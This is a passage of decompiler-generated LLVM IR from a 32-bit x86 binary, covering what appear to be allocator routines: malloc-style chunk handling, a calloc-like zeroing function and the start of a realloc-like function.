dec_label_pc_8050d39:                             ; preds = %dec_label_pc_8050d26, %dec_label_pc_8050d34
  %v0_8050d39 = load i32, i32* @global_var_805336c.33, align 4
  store i32 %v0_8050d39, i32* @ebx, align 4
  %v1_8050d3f = add i32 %v0_8050d39, 4
  %v2_8050d3f = inttoptr i32 %v1_8050d3f to i32*
  %v3_8050d3f = load i32, i32* %v2_8050d3f, align 4
  %v1_8050d42 = and i32 %v3_8050d3f, -4
  store i32 %v1_8050d42, i32* %ecx.global-to-local, align 4
  %v10_8050d45 = icmp ult i32 %v1_8050d42, %v1_80509e2
  br i1 %v10_8050d45, label %dec_label_pc_8050dc5, label %dec_label_pc_8050d4b

dec_label_pc_8050d4b:                             ; preds = %dec_label_pc_8050d39
  store i32 %.v1_80506ce, i32* %esi.global-to-local, align 4
  %v2_8050d51 = sub i32 %v1_8050d42, %.v1_80506ce
  store i32 %v2_8050d51, i32* %ecx.global-to-local, align 4
  %v2_8050d53 = add i32 %v0_8050d39, %.v1_80506ce
  store i32 %v2_8050d53, i32* @edx, align 4
  %v1_8050d56 = or i32 %.v1_80506ce, 1
  store i32 %v1_8050d56, i32* %eax.global-to-local, align 4
  store i32 %v2_8050d53, i32* @global_var_805336c.33, align 4
  store i32 %v1_8050d56, i32* %v2_8050d3f, align 4
  %v0_8050d62.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050d62

dec_label_pc_8050d62:                             ; preds = %dec_label_pc_80509f3, %dec_label_pc_8050d4b
  %v0_8050d62 = phi i32 [ %v5_8050a06, %dec_label_pc_80509f3 ], [ %v0_8050d62.pre, %dec_label_pc_8050d4b ]
  %v1_8050d62 = or i32 %v0_8050d62, 1
  store i32 %v1_8050d62, i32* %ecx.global-to-local, align 4
  %v0_8050d65 = load i32, i32* @ebx, align 4
  %v1_8050d65 = add i32 %v0_8050d65, 8
  store i32 %v1_8050d65, i32* %ebx.global-to-local, align 4
  %v1_8050d68 = load i32, i32* @edx, align 4
  %v2_8050d68 = add i32 %v1_8050d68, 4
  %v3_8050d68 = inttoptr i32 %v2_8050d68 to i32*
  store i32 %v1_8050d62, i32* %v3_8050d68, align 4
  br label %dec_label_pc_8050dd2

dec_label_pc_8050d6d:                             ; preds = %dec_label_pc_80507ad
  %v5_8050d73 = sub i32 %v1_8050790, %.v1_80506ce
  store i32 %v5_8050d73, i32* %eax.global-to-local, align 4
  %v2_8050d77 = add i32 %v1_8050d84, %.v1_80506ce
  store i32 %v2_8050d77, i32* @edx, align 4
  %v1_8050d7b = or i32 %.v1_80506ce, 1
  store i32 %v2_8050d77, i32* @global_var_8053370.34, align 16
  store i32 %v1_8050d7b, i32* %v2_805078a, align 4
  %v0_8050d87 = load i32, i32* %eax.global-to-local, align 4
  %v0_8050d89 = load i32, i32* @edx, align 4
  store i32 %v0_8050d89, i32* @global_var_805337c.51, align 4
  %v1_8050d8f = or i32 %v0_8050d87, 1
  store i32 %v1_8050d8f, i32* %ecx.global-to-local, align 4
  store i32 %v0_8050d89, i32* @global_var_8053380.36, align 128
  %v1_8050d98 = add i32 %v0_8050d89, 8
  %v2_8050d98 = inttoptr i32 %v1_8050d98 to i32*
  store i32 ptrtoint (i32* @global_var_8053374.35 to i32), i32* %v2_8050d98, align 4
  %v0_8050d9f = load i32, i32* @edx, align 4
  %v1_8050d9f = add i32 %v0_8050d9f, 12
  %v2_8050d9f = inttoptr i32 %v1_8050d9f to i32*
  store i32 ptrtoint (i32* @global_var_8053374.35 to i32), i32* %v2_8050d9f, align 4
  %v0_8050da6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050da6 = load i32, i32* @edx, align 4
  %v2_8050da6 = add i32 %v1_8050da6, 4
  %v3_8050da6 = inttoptr i32 %v2_8050da6 to i32*
  store i32 %v0_8050da6, i32* %v3_8050da6, align 4
  %v0_8050da9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050da9 = load i32, i32* @edx, align 4
  %v3_8050da9 = add i32 %v1_8050da9, %v0_8050da9
  %v4_8050da9 = inttoptr i32 %v3_8050da9 to i32*
  store i32 %v0_8050da9, i32* %v4_8050da9, align 4
  br label %dec_label_pc_8050db7

dec_label_pc_8050dae:                             ; preds = %dec_label_pc_80507bc
  store i32 %.v1_80506ce, i32* %ebx.global-to-local, align 4
  %v0_8050db2 = load i32, i32* @ebp, align 4
  %v2_8050db2 = or i32 %.v1_80506ce, 4
  %v3_8050db2 = add i32 %v0_8050db2, %v2_8050db2
  %v4_8050db2 = inttoptr i32 %v3_8050db2 to i32*
  %v5_8050db2 = load i32, i32* %v4_8050db2, align 4
  %v6_8050db2 = or i32 %v5_8050db2, 1
  store i32 %v6_8050db2, i32* %v4_8050db2, align 4
  br label %dec_label_pc_8050db7

dec_label_pc_8050db7:                             ; preds = %dec_label_pc_8050d6d, %dec_label_pc_8050dae
  %v0_8050db7 = load i32, i32* @ebp, align 4
  %v1_8050db7 = add i32 %v0_8050db7, 8
  store i32 %v1_8050db7, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050dd2

dec_label_pc_8050dbc:                             ; preds = %dec_label_pc_80508ac
  %v1_8050dbc = load i32, i32* @ebx, align 4
  %v2_8050dbc = add i32 %v0_80508bb, 4
  %v3_8050dbc = add i32 %v2_8050dbc, %v1_8050dbc
  %v4_8050dbc = inttoptr i32 %v3_8050dbc to i32*
  %v5_8050dbc = load i32, i32* %v4_8050dbc, align 4
  %v6_8050dbc = or i32 %v5_8050dbc, 1
  store i32 %v6_8050dbc, i32* %v4_8050dbc, align 4
  br label %dec_label_pc_8050dc1

dec_label_pc_8050dc1:                             ; preds = %dec_label_pc_80508c4, %dec_label_pc_8050dbc
  %v0_8050dc1 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8050dc1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050dd2

dec_label_pc_8050dc5:                             ; preds = %dec_label_pc_8050b83, %dec_label_pc_8050d39, %dec_label_pc_8050b8d
  %v0_8050dc5 = load i32, i32* %stack_var_-92, align 4
  %v1_8050dc5 = call i32 @function_805021b(i32 %v0_8050dc5)
  store i32 %v1_8050dc5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050dcc = inttoptr i32 %v1_8050dc5 to i32*
  store i32 12, i32* %v1_8050dcc, align 4
  br label %dec_label_pc_8050dd2

dec_label_pc_8050dd2:                             ; preds = %dec_label_pc_8050dc1, %dec_label_pc_8050db7, %dec_label_pc_8050d62, %dec_label_pc_8050a1e, %dec_label_pc_80509d0, %dec_label_pc_8050757, %dec_label_pc_8050dc5
  store i32 %v2_805068e, i32* @eax, align 4
  store i32 %v2_805068e, i32* %stack_var_-92, align 4
  %v2_8050ddb = call i32 @function_8051ba5(i32 %v2_805068e, i32 1)
  store i32 %v2_8050ddb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050de3

dec_label_pc_8050de3:                             ; preds = %dec_label_pc_80506ac, %dec_label_pc_8050dd2
  %v0_8050de6 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050de6, i32* %eax.global-to-local, align 4
  %v2_8050de8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050de8, i32* %ebx.global-to-local, align 4
  store i32 %v0_805067b, i32* @esi, align 4
  store i32 %v0_805067a, i32* @edi, align 4
  store i32 %v0_8050679, i32* @ebp, align 4
  ret i32 %v0_8050de6

; uselistorder directives
  uselistorder i32 %v0_8050da9, { 1, 0 }
  uselistorder i32 %v0_8050d89, { 1, 0, 2 }
  uselistorder i32 %v2_8050d26, { 1, 0, 2 }
  uselistorder i32 %v0_8050d14, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050cab, { 1, 0 }
  uselistorder i32 %v2_8050c99, { 1, 0 }
  uselistorder i32 %v1_8050c50, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8050c3a, { 1, 0, 2 }
  uselistorder i32 %v2_8050c2e, { 1, 2, 0 }
  uselistorder i32 %v2_8050c29, { 1, 0, 2 }
  uselistorder i32 %v1_8050c19, { 2, 1, 0 }
  uselistorder i8 %v0_8050be7, { 1, 0, 2 }
  uselistorder i1 %v10_8050bd0, { 1, 0 }
  uselistorder i32 %v2_8050bca, { 1, 0, 2 }
  uselistorder i32 %v0_8050c8c100, { 3, 1, 2, 4, 0, 6, 5 }
  uselistorder i32 %v1_8050bc4, { 2, 1, 0 }
  uselistorder i32 %v8_8050b9a, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8050b97, { 1, 0 }
  uselistorder i32 %v0_8050b76, { 1, 0 }
  uselistorder i32 %v2_8050b47, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050b3f, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8050b2c, { 1, 0 }
  uselistorder i1 %v2_8050b23, { 2, 1, 0 }
  uselistorder i32 %v1_8050b23, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_8050b10, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8050af4, { 1, 0, 2 }
  uselistorder i32 %v2_8050ae0, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8050aa9, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050a9d, { 2, 1, 0 }
  uselistorder i32 %v8_8050a8c, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8050a73, { 1, 0, 2 }
  uselistorder i32 %v0_8050a0f, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_80509e2, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80509d8, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_80509ca, { 1, 0 }
  uselistorder i32 %v1_8050961, { 1, 0 }
  uselistorder i32 %v3_8050955, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8050965, { 1, 0 }
  uselistorder i32 %v2_805094f, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805094c7, { 1, 0 }
  uselistorder i32 %v2_8050941, { 1, 0 }
  uselistorder i32 %v1_8050925, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8050921, { 2, 1, 0 }
  uselistorder i32 %v1_805091d, { 1, 0 }
  uselistorder i32 %v1_8050911, { 2, 1, 0 }
  uselistorder i32 %v2_8050907, { 1, 0 }
  uselistorder i32 %v1_8050904, { 1, 2, 0 }
  uselistorder i32 %v4_80508a2, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_80508ed, { 1, 0 }
  uselistorder i32 %v0_80508bb, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805088e, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805085b, { 0, 2, 1 }
  uselistorder i32 %v2_805083f, { 1, 0 }
  uselistorder i32 %v1_8050835, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8050830.lcssa, { 1, 0 }
  uselistorder i32 %v3_8050820, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8050817, { 1, 0, 2 }
  uselistorder i32 %v2_80507f3, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80507db, { 2, 1, 0 }
  uselistorder i32 %v0_80507c7, { 2, 0, 3, 1 }
  uselistorder i32 %v3_805078d, { 1, 0, 2 }
  uselistorder i32 %v1_8050d84, { 0, 1, 3, 2 }
  uselistorder i32 %v0_805085b9, { 1, 0, 2 }
  uselistorder i32 %v3_805073a, { 1, 0, 2 }
  uselistorder i32 %v2_805072c, { 2, 1, 0 }
  uselistorder i1 %v6_8050726, { 1, 0, 2 }
  uselistorder i32 %v2_8050707, { 2, 1, 0 }
  uselistorder i8 %v0_80506d5, { 2, 1, 3, 0, 4 }
  uselistorder i32 %.v1_80506ce, { 30, 12, 31, 2, 14, 32, 3, 21, 22, 33, 34, 4, 19, 20, 23, 25, 24, 5, 18, 17, 6, 16, 15, 28, 7, 27, 26, 35, 13, 29, 0, 11, 9, 10, 1, 8 }
  uselistorder i32 %v1_80506be, { 0, 2, 1 }
  uselistorder i32 %v0_80506a7, { 1, 0 }
  uselistorder i32 %v2_805068e, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 0, 19, 1, 2, 3, 4, 5, 6, 7, 8, 24, 9, 25, 10, 11, 12, 13, 14, 15, 23, 16, 17, 18, 20, 21, 22 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_80536a0.48, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8051ebc, { 1, 0 }
  uselistorder i32 134558580, { 1, 3, 0, 2 }
  uselistorder i32* @global_var_8053380.36, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_8050653, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805336c.33 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805336c.33 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8050de3, { 1, 0 }
  uselistorder label %dec_label_pc_8050dd2, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8050dc5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050dc1, { 1, 0 }
  uselistorder label %dec_label_pc_8050db7, { 1, 0 }
  uselistorder label %dec_label_pc_8050d62, { 1, 0 }
  uselistorder label %dec_label_pc_8050d39, { 1, 0 }
  uselistorder label %dec_label_pc_8050d26, { 1, 0 }
  uselistorder label %dec_label_pc_8050d14, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050ca6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050ca1, { 1, 0 }
  uselistorder label %dec_label_pc_8050c2e, { 1, 0 }
  uselistorder label %dec_label_pc_8050c17, { 1, 0 }
  uselistorder label %dec_label_pc_8050c00, { 1, 0 }
  uselistorder label %dec_label_pc_8050b83, { 1, 0 }
  uselistorder label %dec_label_pc_8050b76, { 1, 0 }
  uselistorder label %dec_label_pc_8050b37, { 1, 0 }
  uselistorder label %dec_label_pc_8050b10, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8050af4, { 1, 0 }
  uselistorder label %dec_label_pc_8050adb, { 1, 0 }
  uselistorder label %dec_label_pc_8050abd, { 1, 0 }
  uselistorder label %dec_label_pc_80509d8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80509d0, { 1, 0 }
  uselistorder label %dec_label_pc_80509b9, { 1, 0 }
  uselistorder label %dec_label_pc_805094c, { 1, 0 }
  uselistorder label %dec_label_pc_8050951.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050925, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80508ac, { 1, 0 }
  uselistorder label %dec_label_pc_805085b, { 1, 0 }
  uselistorder label %dec_label_pc_8050833, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805081c, { 1, 0 }
  uselistorder label %dec_label_pc_805078a, { 1, 0 }
  uselistorder label %dec_label_pc_805085b.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050757, { 1, 0, 3, 2 }
}

define i32 @function_8050ded(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050ded:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8050ded = load i32, i32* @edi, align 4
  %v0_8050def = load i32, i32* @ebx, align 4
  %v12_8050df0 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8050df3 = trunc i64 %arg1 to i32
  %sext = mul i64 %arg1, 4294967296
  %v2_8050dfd = sdiv i64 %sext, 4294967296
  %v3_8050dfd = sext i32 %arg2 to i64
  %v4_8050dfd = mul nsw i64 %v3_8050dfd, %v2_8050dfd
  %v5_8050dfd = trunc i64 %v4_8050dfd to i32
  store i32 %v5_8050dfd, i32* @ebx, align 4
  %v2_8050e00 = icmp eq i32 %v4_8050df3, 0
  br i1 %v2_8050e00, label %dec_label_pc_8050e22, label %dec_label_pc_8050e04

dec_label_pc_8050e04:                             ; preds = %dec_label_pc_8050ded
  store i32 %v4_8050df3, i32* @edi, align 4
  %div = udiv i32 %v5_8050dfd, %v4_8050df3
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_8050e0c = icmp eq i32 %div, %arg2
  br i1 %v12_8050e0c, label %dec_label_pc_8050e22, label %dec_label_pc_8050e10

dec_label_pc_8050e10:                             ; preds = %dec_label_pc_8050e04
  %v1_8050e10 = call i32 @function_805021b(i32 %v0_8050def)
  store i32 %v1_8050e10, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050e17 = inttoptr i32 %v1_8050e10 to i32*
  store i32 12, i32* %v1_8050e17, align 4
  br label %dec_label_pc_8050ed8

dec_label_pc_8050e22:                             ; preds = %dec_label_pc_8050e04, %dec_label_pc_8050ded
  store i32 %v12_8050df0, i32* @eax, align 4
  %v2_8050e32 = call i32 @function_8051ba5(i32 %v12_8050df0, i32 134552482)
  store i32 %v2_8050e32, i32* %eax.global-to-local, align 4
  %v1_8050e3e = call i32 @function_8051ba2(i32 ptrtoint (i32* @global_var_805303c.31 to i32))
  store i32 %v1_8050e3e, i32* %eax.global-to-local, align 4
  %v0_8050e43 = load i32, i32* @ebx, align 4
  %v1_8050e46 = call i32 @function_8050679(i32 %v0_8050e43)
  store i32 %v1_8050e46, i32* %eax.global-to-local, align 4
  store i32 %v1_8050e46, i32* %ebx.global-to-local, align 4
  %v1_8050e50 = icmp eq i32 %v1_8050e46, 0
  br i1 %v1_8050e50, label %dec_label_pc_8050ec7, label %dec_label_pc_8050e54

dec_label_pc_8050e54:                             ; preds = %dec_label_pc_8050e22
  %v1_8050e54 = add i32 %v1_8050e46, -4
  %v2_8050e54 = inttoptr i32 %v1_8050e54 to i32*
  %v3_8050e54 = load i32, i32* %v2_8050e54, align 4
  store i32 %v3_8050e54, i32* %eax.global-to-local, align 4
  %v2_8050e57 = and i32 %v3_8050e54, 2
  %v3_8050e57 = icmp eq i32 %v2_8050e57, 0
  %v1_8050e59 = icmp eq i1 %v3_8050e57, false
  br i1 %v1_8050e59, label %dec_label_pc_8050ec7, label %dec_label_pc_8050e5b

dec_label_pc_8050e5b:                             ; preds = %dec_label_pc_8050e54
  %v1_8050e5b4 = add i32 %v3_8050e54, -4
  %v1_8050e5e = and i32 %v1_8050e5b4, -4
  %v2_8050e63 = udiv i32 %v1_8050e5e, 4
  store i32 %v2_8050e63, i32* %eax.global-to-local, align 4
  %v5_8050e66 = icmp ult i32 %v1_8050e5e, 36
  %tmp = and i32 %v1_8050e5b4, -4
  %tmp19 = icmp eq i32 %tmp, 36
  %v2_8050e69 = or i1 %v5_8050e66, %tmp19
  br i1 %v2_8050e69, label %dec_label_pc_8050e7a, label %dec_label_pc_8050e6b

dec_label_pc_8050e6b:                             ; preds = %dec_label_pc_8050e5b
  %v3_8050e70 = inttoptr i32 %v1_8050e46 to i8*
  %v4_8050e70 = call i32 @function_805026c(i8* %v3_8050e70, i32 0, i32 %v1_8050e5e)
  store i32 %v4_8050e70, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050ec7

dec_label_pc_8050e7a:                             ; preds = %dec_label_pc_8050e5b
  %v1_8050e7a = inttoptr i32 %v1_8050e46 to i32*
  store i32 0, i32* %v1_8050e7a, align 4
  %v0_8050e80 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050e80 = add i32 %v0_8050e80, 4
  %v2_8050e80 = inttoptr i32 %v1_8050e80 to i32*
  store i32 0, i32* %v2_8050e80, align 4
  %v0_8050e87 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050e87 = add i32 %v0_8050e87, 8
  %v2_8050e87 = inttoptr i32 %v1_8050e87 to i32*
  store i32 0, i32* %v2_8050e87, align 4
  %v0_8050e8e = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_8050e8e, 5
  br i1 %tmp16, label %dec_label_pc_8050ec7, label %dec_label_pc_8050e93

dec_label_pc_8050e93:                             ; preds = %dec_label_pc_8050e7a
  %v0_8050e93 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050e93 = add i32 %v0_8050e93, 12
  %v2_8050e93 = inttoptr i32 %v1_8050e93 to i32*
  store i32 0, i32* %v2_8050e93, align 4
  %v0_8050e9a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050e9a = add i32 %v0_8050e9a, 16
  %v2_8050e9a = inttoptr i32 %v1_8050e9a to i32*
  store i32 0, i32* %v2_8050e9a, align 4
  %v0_8050ea1 = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_8050ea1, 7
  br i1 %tmp17, label %dec_label_pc_8050ec7, label %dec_label_pc_8050ea6

dec_label_pc_8050ea6:                             ; preds = %dec_label_pc_8050e93
  %v0_8050ea6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050ea6 = add i32 %v0_8050ea6, 20
  %v2_8050ea6 = inttoptr i32 %v1_8050ea6 to i32*
  store i32 0, i32* %v2_8050ea6, align 4
  %v0_8050ead = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050ead = add i32 %v0_8050ead, 24
  %v2_8050ead = inttoptr i32 %v1_8050ead to i32*
  store i32 0, i32* %v2_8050ead, align 4
  %v0_8050eb4 = load i32, i32* %eax.global-to-local, align 4
  %tmp18 = icmp ult i32 %v0_8050eb4, 9
  br i1 %tmp18, label %dec_label_pc_8050ec7, label %dec_label_pc_8050eb9

dec_label_pc_8050eb9:                             ; preds = %dec_label_pc_8050ea6
  %v0_8050eb9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050eb9 = add i32 %v0_8050eb9, 28
  %v2_8050eb9 = inttoptr i32 %v1_8050eb9 to i32*
  store i32 0, i32* %v2_8050eb9, align 4
  %v0_8050ec0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050ec0 = add i32 %v0_8050ec0, 32
  %v2_8050ec0 = inttoptr i32 %v1_8050ec0 to i32*
  store i32 0, i32* %v2_8050ec0, align 4
  br label %dec_label_pc_8050ec7

dec_label_pc_8050ec7:                             ; preds = %dec_label_pc_8050ea6, %dec_label_pc_8050e93, %dec_label_pc_8050e7a, %dec_label_pc_8050e54, %dec_label_pc_8050e22, %dec_label_pc_8050e6b, %dec_label_pc_8050eb9
  store i32 %v12_8050df0, i32* @eax, align 4
  %v2_8050ed0 = call i32 @function_8051ba5(i32 %v12_8050df0, i32 1)
  store i32 %v2_8050ed0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050ed8

dec_label_pc_8050ed8:                             ; preds = %dec_label_pc_8050e10, %dec_label_pc_8050ec7
  %v0_8050edb = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050edb, i32* %eax.global-to-local, align 4
  store i32 %v0_8050def, i32* @ebx, align 4
  store i32 %v0_8050ded, i32* @edi, align 4
  ret i32 %v0_8050edb

; uselistorder directives
  uselistorder i32 %v1_8050e5e, { 2, 1, 0 }
  uselistorder i32 %v1_8050e46, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i64 4294967296, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050ed8, { 1, 0 }
  uselistorder label %dec_label_pc_8050ec7, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_8050ee1(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050ee1:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8050ee4 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_8050eec = icmp eq i32* %arg1, null
  %v1_8050ef1 = icmp eq i1 %v4_8050eec, false
  br i1 %v1_8050ef1, label %dec_label_pc_8050f03, label %dec_label_pc_8050ef3

dec_label_pc_8050ef3:                             ; preds = %dec_label_pc_8050ee1
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8050ef7 = call i32 @function_8050679(i32 %arg2)
  store i32 %v1_8050ef7, i32* %eax.global-to-local, align 4
  store i32 %v1_8050ef7, i32* @ebx, align 4
  br label %dec_label_pc_80511fc

dec_label_pc_8050f03:                             ; preds = %dec_label_pc_8050ee1
  %v1_8050f03 = icmp eq i32 %arg2, 0
  %v1_8050f05 = icmp eq i1 %v1_8050f03, false
  br i1 %v1_8050f05, label %dec_label_pc_8050f18, label %dec_label_pc_8050f07

dec_label_pc_8050f07:                             ; preds = %dec_label_pc_8050f03
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8050f0e = call i32 @function_805143e(i32 %tmp7)
  store i32 %v1_8050f0e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80511fc

dec_label_pc_8050f18:                             ; preds = %dec_label_pc_8050f03
  %v2_8050f23 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050f23, i32* @eax, align 4
  store i32 %v2_8050f23, i32* %stack_var_-60, align 4
  %v2_8050f28 = call i32 @function_8051ba5(i32 %v2_8050f23, i32 134552482)
  store i32 %v2_8050f28, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805303c.31 to i32), i32* %stack_var_-60, align 4
  %v1_8050f34 = call i32 @function_8051ba2(i32 ptrtoint (i32* @global_var_805303c.31 to i32))
  store i32 %v1_8050f34, i32* %eax.global-to-local, align 4
  %v0_8050f3c = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8050f3c, -32
  br i1 %tmp21, label %dec_label_pc_8050f53, label %dec_label_pc_8050f41

dec_label_pc_8050f41:                             ; preds = %dec_label_pc_8050f18
  %v0_8050f41 = load i32, i32* %stack_var_-60, align 4
  %v1_8050f41 = call i32 @function_805021b(i32 %v0_8050f41)
  store i32 %v1_8050f41, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8050f48 = inttoptr i32 %v1_8050f41 to i32*
  store i32 12, i32* %v1_8050f48, align 4
  br label %dec_label_pc_80511ff

dec_label_pc_8050f53:                             ; preds = %dec_label_pc_8050f18
  %v1_8050f53 = add i32 %v0_8050f3c, 11
  %tmp22 = icmp ult i32 %v1_8050f53, 16
  %v1_8050f63 = and i32 %v1_8050f53, -8
  %v1_8050f53.v1_8050f63 = select i1 %tmp22, i32 %v1_8050f53, i32 %v1_8050f63
  %.v1_8050f63 = select i1 %tmp22, i32 16, i32 %v1_8050f63
  store i32 %v1_8050f53.v1_8050f63, i32* %eax.global-to-local, align 4
  %v1_8050f6e = add i32 %tmp7, -8
  store i32 %v1_8050f6e, i32* @edi, align 4
  %v1_8050f71 = add i32 %tmp7, -4
  %v2_8050f71 = inttoptr i32 %v1_8050f71 to i32*
  %v3_8050f71 = load i32, i32* %v2_8050f71, align 4
  store i32 %v3_8050f71, i32* %edx.global-to-local, align 4
  %v1_8050f76 = and i32 %v3_8050f71, -4
  store i32 %v1_8050f76, i32* %eax.global-to-local, align 4
  %v2_8050f7d = and i32 %v3_8050f71, 2
  %v3_8050f7d = icmp eq i32 %v2_8050f7d, 0
  %v1_8050f80 = icmp eq i1 %v3_8050f7d, false
  br i1 %v1_8050f80, label %dec_label_pc_805111a, label %dec_label_pc_8050f86

dec_label_pc_8050f86:                             ; preds = %dec_label_pc_8050f53
  store i32 %.v1_8050f63, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050f76, i32* @ebx, align 4
  %v7_8050f8c = icmp ult i32 %v1_8050f76, %.v1_8050f63
  %v1_8050f8e = icmp eq i1 %v7_8050f8c, false
  br i1 %v1_8050f8e, label %dec_label_pc_80510c5, label %dec_label_pc_8050f94

dec_label_pc_8050f94:                             ; preds = %dec_label_pc_8050f86
  %v2_8050f94 = add i32 %v1_8050f76, %v1_8050f6e
  store i32 %v2_8050f94, i32* @esi, align 4
  %v1_8050f97 = load i32, i32* @global_var_805336c.33, align 4
  %v12_8050f97 = icmp eq i32 %v2_8050f94, %v1_8050f97
  %v1_8050f9d = icmp eq i1 %v12_8050f97, false
  %v1_8050fd7 = add i32 %v2_8050f94, 4
